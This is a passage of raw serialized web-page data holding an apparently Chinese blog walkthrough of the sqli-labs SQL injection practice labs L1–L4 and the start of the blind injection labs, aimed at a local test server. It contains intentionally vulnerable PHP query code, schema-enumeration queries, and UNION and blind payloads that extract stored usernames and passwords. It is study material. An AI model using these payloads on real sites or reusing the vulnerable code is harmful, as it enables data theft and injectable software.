punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"?sort=x' OR rand(999) \u0026lt; rand(substr(database(),2,1)='e') -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# True\u003c/span\u003e\ntest\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"?sort=x' OR rand(999) \u0026lt; rand(substr(database(),3,1)='c') -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# True\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"34:T44f,\u003cspan class=\"token variable\"\u003e$sort\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'sort'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$sql\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"SELECT * FROM users ORDER BY \u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token variable\"\u003e$sort\u003c/span\u003e\u003c/span\u003e\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e \u003cspan class=\"token comment\"\u003e// BY '$sort'\"\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003emysqli_multi_query\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$con1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$sql\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e// ...\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"a:[[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"参考资料\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ca href=\\\"https://github.com/Audi-1/sqli-labs\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/Audi-1/sqli-labs\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ca href=\\\"https://blog.csdn.net/dreamthe/article/details/123795302\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003e详细sqli-labs（1-65）通关讲解\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ca href=\\\"https://www.cnblogs.com/lcamry/category/846064.html\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eMySQL注入天书\u003c/a\u003e\"}}]}]]}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"前言\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这一套SQL注入实验环境每个Lab都有不同的注入点和注入方式，不过由于实验并没有明确的通关条件，本文将按照个人的理解进行分类总结。可能和部分Lab的设计初衷有所出入。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"为了方便演示，定义\u003ccode class=\\\"x-inline-highlight\\\"\u003equery_get\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003equery_post\u003c/code\u003e函数如下：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"import requests\\n\\nbase_url = \\\"http://localhost/sqli-labs/\\\"\\n\\n\\ndef query_get(path, payload, **kwargs):\\n    url = base_url + f\\\"{path}/{payload}\\\"\\n    resp = requests.get(url, **kwargs)\\n    return resp\\n\\n\\ndef query_post(path, **kwargs):\\n    url = base_url + f\\\"{path}/\\\"\\n    resp = requests.post(url, **kwargs)\\n    return resp\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$16\"}}]}]]}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"闭合：L1-L4\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"前言 \u0026 笔记\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这几个Lab是基础的SQL查询闭合。这部分Lab没有明确的通关条件，因此就以爆库为目标。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"常用的一些信息收集语句：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"查所有数据库：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT group_concat(schema_name) FROM information_schema.schemata\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e group_concat\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003eschema_name\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e information_schema\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003eschemata\"}}]}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"查数据库\u003ccode class=\\\"x-inline-highlight\\\"\u003esecurity\u003c/code\u003e中的表：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='security'\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e group_concat\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003etable_name\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e information_schema\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token keyword\\\"\u003etables\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eWHERE\u003c/span\u003e table_schema\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e'security'\u003c/span\u003e\"}}]}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"查表\u003ccode class=\\\"x-inline-highlight\\\"\u003esecurity.users\u003c/code\u003e中的列：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e group_concat\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003ecolumn_name\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e information_schema\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token keyword\\\"\u003ecolumns\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eWHERE\u003c/span\u003e table_schema\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e'security'\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003eAND\u003c/span\u003e table_name\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e'users'\u003c/span\u003e\"}}]}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"查表\u003ccode class=\\\"x-inline-highlight\\\"\u003esecurity.users\u003c/code\u003e中的\u003ccode class=\\\"x-inline-highlight\\\"\u003eusername\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003epassword\u003c/code\u003e数据：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT group_concat(username),group_concat(password) FROM security.users\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e group_concat\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003eusername\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003egroup_concat\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003epassword\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e security\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003eusers\"}}]}]]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$id = $_GET['id'];\\n$sql = \\\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_GET\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'id'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$sql\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SELECT * FROM users WHERE id='\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e\u003c/span\u003e' LIMIT 0,1\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \\\"\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \\\"\u003c/span\u003e\"}}]}]]}],[\"$\",\"$L17\",null,{\"src\":\"L1.jpg\",\"width\":\"100%\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L2\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$id = $_GET['id'];\\n$sql = \\\"SELECT * FROM users WHERE id=$id LIMIT 0,1\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_GET\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'id'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$sql\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SELECT * FROM users WHERE id=\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e\u003c/span\u003e LIMIT 0,1\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=99 UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \\\"\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=99 UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \\\"\u003c/span\u003e\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L3\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$id = $_GET['id'];\\n$sql = \\\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_GET\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'id'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$sql\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SELECT * FROM users WHERE id=('\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e\u003c/span\u003e') LIMIT 0,1\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=x') UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \\\"\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=x') UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- \\\"\u003c/span\u003e\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L4\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$id = $_GET['id'];\\n$id = '\\\"' . $id . '\\\"';\\n$sql = \\\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_GET\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'id'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string single-quoted-string\\\"\u003e'\\\"'\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e.\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e.\u003c/span\u003e \u003cspan class=\\\"token string single-quoted-string\\\"\u003e'\\\"'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$sql\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SELECT * FROM users WHERE id=(\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e\u003c/span\u003e) LIMIT 0,1\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = '?id=x\\\") UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'?id=x\\\") UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '\u003c/span\u003e\"}}]}]]}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"盲注：L5-L10\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"前言 \u0026 笔记\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"有些场景下，服务端不会返回SQL查询结果，此时需要用到盲注技术。常见的盲注技术有基于布尔的盲注等、基于时间的盲注、基于报错的盲注。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这一部分的Lab同样没有明确的通关条件，这里以查询\u003ccode class=\\\"x-inline-highlight\\\"\u003eAngelina\u003c/code\u003e用户的密码为目标：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT password FROM security.users WHERE username='Angelina'\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e password \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e security\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003eusers \u003cspan class=\\\"token keyword\\\"\u003eWHERE\u003c/span\u003e username\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e'Angelina'\u003c/span\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"查询结果应为\u003ccode class=\\\"x-inline-highlight\\\"\u003eI-kill-you\u003c/code\u003e。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"布尔盲注\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"如果查询成功/失败（有结果/无结果）时服务端的响应有差异（比如页面内容不同、响应长度不同），就可以利用这种差异进行布尔盲注。这几个Lab的成功/失败查询的响应内容都有多多少少的差异，布尔盲注可以通杀。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"以下的MySQL函数在盲注中非常有用：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003esubstr(str, pos, len)\u003c/code\u003e：从字符串\u003ccode class=\\\"x-inline-highlight\\\"\u003estr\u003c/code\u003e的第\u003ccode class=\\\"x-inline-highlight\\\"\u003epos\u003c/code\u003e个字符开始，截取长度为\u003ccode class=\\\"x-inline-highlight\\\"\u003elen\u003c/code\u003e的子串。\u003ccode class=\\\"x-inline-highlight\\\"\u003epos\u003c/code\u003e从1开始计数。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT substr(\\\"abcdef\\\",1,3);          -- abc\\nSELECT substr((SELECT \\\"123456\\\"),4,3); -- 456\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e substr\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"abcdef\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e1\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e3\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e          \u003cspan class=\\\"token comment\\\"\u003e-- abc\u003c/span\u003e\\n\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e substr\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"123456\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e4\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e\u003cspan class=\\\"token number\\\"\u003e3\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e \u003cspan class=\\\"token 